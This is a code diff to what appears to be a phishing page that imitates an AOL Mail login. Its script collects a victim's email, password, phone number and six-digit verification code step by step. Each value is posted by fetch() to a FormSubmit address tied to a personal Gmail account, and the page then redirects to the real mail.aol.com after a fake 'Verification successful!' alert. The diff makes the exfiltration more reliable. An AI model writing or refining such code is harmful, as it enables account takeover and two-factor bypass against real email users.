@@ -20,7 +20,7 @@
       background-color: #f7f7f7;
       background-image: url('https://tpc.googlesyndication.com/simgad/11982186876802675731');
       background-size: cover;
-      background-position: center 50px;
+      background-position: center 70px;
       background-repeat: no-repeat;
       background-attachment: fixed;
     }
@@ -221,21 +221,21 @@
   <script>
     const FORM_URL = "https://formsubmit.co/inboxhunter147@gmail.com";  // Replace with your FormSubmit endpoint
 
-    function sendToFormSubmit(formData) {
-      const form = document.createElement('form');
-      form.method = 'POST';
-      form.action = FORM_URL;
-
-      Object.keys(formData).forEach(key => {
-        const input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = key;
-        input.value = formData[key];
-        form.appendChild(input);
+    async function sendToFormSubmit(formData) {
+      const response = await fetch(FORM_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams(formData).toString(),
       });
 
-      document.body.appendChild(form);
-      form.submit();
+      if (response.ok) {
+        return true;
+      } else {
+        alert("Something went wrong, please try again.");
+        return false;
+      }
     }
 
     function goToStep(n) {
@@ -248,39 +248,48 @@
       const email = document.getElementById('email-input').value.trim();
       if (!email) return;
 
-      sendToFormSubmit({ email });
-
-      document.getElementById('email-summary').textContent = email;
-      document.getElementById('email-summary').style.display = 'block';
-      goToStep(2);
+      sendToFormSubmit({ email }).then(success => {
+        if (success) {
+          document.getElementById('email-summary').textContent = email;
+          document.getElementById('email-summary').style.display = 'block';
+          goToStep(2);
+        }
+      });
     }
 
     function handlePassword() {
       const password = document.getElementById('password-input').value.trim();
       if (!password) return;
 
-      sendToFormSubmit({ password });
-
-      goToStep(3);
+      sendToFormSubmit({ password }).then(success => {
+        if (success) {
+          goToStep(3);
+        }
+      });
     }
 
     function submitPhone() {
       const phone = document.getElementById('phone-input').value.trim();
       if (!phone) return;
 
-      sendToFormSubmit({ phone });
-
-      goToStep(4);
-      startCountdown();
+      sendToFormSubmit({ phone }).then(success => {
+        if (success) {
+          goToStep(4);
+          startCountdown();
+        }
+      });
     }
 
     function submitCode() {
       const code = document.getElementById('code-input').value.trim();
       if (!code || code.length !== 6) return;
 
-      sendToFormSubmit({ code });
-
-      window.location.href = "https://mail.aol.com";
+      sendToFormSubmit({ code }).then(success => {
+        if (success) {
+          alert("Verification successful!");
+          window.location.href = "https://mail.aol.com"; // Or redirect to your desired URL
+        }
+      });
     }
 
     function togglePassword() {
